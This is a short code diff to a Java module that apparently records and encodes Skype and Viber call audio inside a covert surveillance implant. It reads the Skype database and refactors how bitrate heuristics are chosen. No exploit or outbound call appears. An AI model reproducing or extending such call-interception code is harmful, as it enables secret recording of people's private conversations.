@@ -941,25 +941,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Decide heuristics logic
 		boolean heur = false;
 		
-		if (callInfo.programId == 0x0146 && remote) { // Skype
+		if (callInfo.heur && remote) { // Skype
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
 			
 			heur = true;
-		} else if (callInfo.programId == 0x0148) { // Viber
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): Viber call in progress, disabling bitrate heuristics");
-			}
-			
-			heur = false;
-		} else {
-			// This case should already been taken care of by the previous updateCallInfo()
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (encodeChunks): unknown call program");
-			}
-			
-			return;
 		}
 
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heur))) {
@@ -1106,6 +1093,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			callInfo.account = account;
 			callInfo.programId = 0x0146;
 			callInfo.delay = false;
+			callInfo.heur = true;
 
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
@@ -1119,6 +1107,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			boolean ret = false;
 			callInfo.processName = "com.viber.voip";
 			callInfo.delay = true;
+			callInfo.heur = false;
+			
 			// open DB
 			callInfo.programId = 0x0148;
 			if (end) {
